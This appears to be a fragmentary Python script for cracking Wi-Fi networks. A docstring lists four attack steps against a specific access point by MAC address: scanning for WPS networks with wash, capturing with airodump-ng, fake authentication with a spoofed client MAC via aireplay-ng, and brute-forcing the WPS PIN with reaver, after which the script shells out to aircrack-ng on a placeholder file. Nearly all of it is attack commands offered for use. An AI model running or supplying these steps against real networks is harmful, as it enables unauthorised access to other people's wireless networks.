#!/usr/bin/env python

import subprocess as s

interface = "wlan0"
airmon_interface = "wlan0mon"
"""
Check for WPS after monitor mode is enabled for wlan0mon,
1.
wash --interface wlan0mon      Will Display all WPS Networks.
2.
airodump-ng --bssid 20:4E:7F:96:16:AA --channel 11 wlan0mon
3.
aireplay-ng --fakeauth 30 -a 20:4E:7F:96:16:AA -h 00:C0:CA:97:5B:F4 wlan0mon
4.
./reaver --bssid 20:4E:7F:96:16:AA --channel 11 --interface wlan0mon -vvv --no-associate


"""

s.call("aircrack-ng FILENAME", shell=True)
